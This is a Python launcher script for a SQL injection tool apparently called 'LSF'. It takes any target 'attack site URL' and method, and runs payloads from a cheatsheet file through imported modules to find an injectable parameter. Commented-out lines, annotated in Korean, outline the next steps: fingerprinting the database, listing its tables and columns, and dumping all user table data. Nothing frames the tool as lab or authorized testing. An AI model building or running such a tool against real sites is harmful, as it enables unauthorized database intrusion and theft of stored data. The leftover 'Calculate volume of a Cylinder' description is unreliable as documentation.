# import string
# from search import getexable
# from search import getinfo
# from search import gettype
# from search import getdata


from web import Link, ExploitLink
from sqli import SQLi, read_cheatsheet
import time

from turtle import width
from pyfiglet import figlet_format
from rich import print
from rich.console import Console


from pyfiglet import Figlet
import argparse


def get_args():
    parser = argparse.ArgumentParser(description='Calculate volume of a Cylinder')
    parser.add_argument('-u','--URL',  metavar='', required=True, help = 'Enter attack site URL' )
    parser.add_argument('-m','--method', metavar='', required=True, help = 'Attack Site Method "Post" or "Get"' ,default='Get')
    parser.add_argument('-gm','--getmethod', metavar='', required=False, help = 'Attack Site Get method value' , default='params')
    parser.add_argument('-t','--timesleep', metavar='', required=False, help = 'Delay seconds to test' , default='1')
    args = parser.parse_args()


    return args


def cli_info():
    console = Console()
    art = figlet_format("LSF", font = "slant", width = 9000)
    art1 = figlet_format("By. Layer7", font = "smslant" , width = 1000)
    console.print("[red]"+art+"[/red]"+art1)
    #console.print("[blue_violet]"+art1+"[/blue_violet]")
    #print('[blue_violet]'+art + '[purple]'+art1)



def main():
    args = get_args()

    cli_info()

    payload = SQLi().run(Link(args.URL, args.method, {args.getmethod: '3'}), read_cheatsheet('./cheatsheet'), args.timesleep)             # 공격 가능한 페이로드 얻기
    # print('[{0}] Succed payload => {1}'.format(time.strftime('%X'),payload))
    #dbtype = gettype.attack(payload)                    # DB 정보 얻기
    #dbinfo = getinfo.attack(payload, dbtype)            # DB, TABLE, COLUMN 정보 얻기   (only 유저 테이블)
    #dbdata = getdata.attack(payload, dbtype, dbinfo)    # DB 테이블의 정보 다 뜯어오기   (only 유저 테이블)
    
    #print(f"dbtype: {dbtype}, dbinfo: {dbinfo}, data: {dbdata}")
    #print(f"dbtype: {dbtype}, dbinfo: {dbinfo}")


if __name__ == "__main__":
    
    main()
